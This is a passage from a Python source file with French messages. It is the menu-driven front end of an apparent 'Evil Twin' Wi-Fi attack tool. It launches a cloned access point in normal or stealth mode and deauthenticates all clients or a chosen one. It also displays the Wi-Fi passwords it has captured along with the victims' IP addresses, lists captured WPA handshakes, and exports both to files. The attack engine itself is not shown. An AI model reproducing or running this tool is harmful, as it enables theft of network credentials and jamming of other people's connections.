        print(f"✅ Attaque lancée en mode {mode}")
        print(f"📡 SSID cloné: {net['ssid']}")
    
    def deauth_all(self):
        self.engine.deauth_attack()
        print("📡 Deauth sur tous les clients lancée")
    
    def deauth_selective(self):
        clients = self.engine.get_clients()
        if not clients:
            print("❌ Aucun client trouvé")
            return
        
        print("\n👥 Clients connectés:")
        for i, mac in enumerate(clients, 1):
            print(f"  {i}. {mac}")
        
        choice = input("\n👉 Choisissez une cible: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(clients):
            self.engine.selective_jamming(clients[int(choice)-1])
        else:
            print("❌ Sélection invalide")
    
    def show_clients(self):
        clients = self.engine.get_clients()
        if not clients:
            print("📋 Aucun client connecté")
        else:
            print(f"\n👥 CLIENTS CONNECTÉS ({len(clients)})")
            print("-" * 30)
            for mac in clients:
                print(f"  • {mac}")
            print("-" * 30)
    
    def show_passwords(self):
        passwords = self.engine.passwords
        if not passwords:
            print("📋 Aucun mot de passe capturé")
        else:
            print(f"\n🔑 MOTS DE PASSE CAPTURÉS ({len(passwords)})")
            print("-" * 50)
            for pwd in passwords:
                print(f"  • {pwd['password']} (depuis {pwd['ip']}) - {pwd['timestamp']}")
            print("-" * 50)
    
    def show_handshakes(self):
        if not self.engine.handshakes:
            print("📋 Aucun handshake capturé")
        else:
            print(f"\n🤝 HANDSHAKES CAPTURÉS ({len(self.engine.handshakes)})")
            print("-" * 50)
            for hs in self.engine.handshakes:
                print(f"  • {hs}")
            print("-" * 50)
    
    def export_data(self):
        timestamp = time.strftime('%Y%m%d_%H%M%S')
        
        if self.engine.passwords:
            with open(f'passwords_{timestamp}.json', 'w') as f:
                json.dump(self.engine.passwords, f, indent=2)
            print(f"✅ Mots de passe exportés: passwords_{timestamp}.json")
        
        if self.engine.handshakes:
            for hs in self.engine.handshakes:
                if os.path.exists(hs):
                    shutil.copy2(hs, f'handshake_{timestamp}.cap')
                    print(f"✅ Handshake exporté: handshake_{timestamp}.cap")
    
    def run(self):
        self.clear_screen()
        self.show_banner()
        self.show_interface_menu()
        
        while self.running:
            self.show_menu()
            
            choice = input("\n👉 Votre choix: ").strip()
            
            if choice == '1':
                self.show_networks()
            elif choice == '2':
                self.select_target()
            elif choice == '3':
                self.start_attack(stealth=False)
            elif choice == '4':
                self.start_attack(stealth=True)
            elif choice == '5':
                self.deauth_all()
            elif choice == '6':
                self.deauth_selective()
            elif choice == '7':
                self.show_clients()
            elif choice == '8':
                self.show_passwords()
            elif choice == '9':
                self.show_handshakes()
            elif choice == '10':
                self.export_data()
            elif choice == '11':
                self.engine.stop_attack()
            elif choice == '0':
                if self.engine.running:
                    self.engine.stop_attack()
                self.running = False
                print("👋 Au revoir!")
            else:
                print("❌ Option invalide")
            
            if self.running:
                input("\nAppuyez sur Entrée pour continuer...")
                self.clear_screen()
                self.show_banner()

# ==================== MAIN ====================

if __name__ == "__main__":
    try:
        check_root()
        check_dependencies()
        
        cli = EvilTwinCLI()
        cli.run()
        
    except KeyboardInterrupt:
        print("\n\n👋 Interruption")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur fatale: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)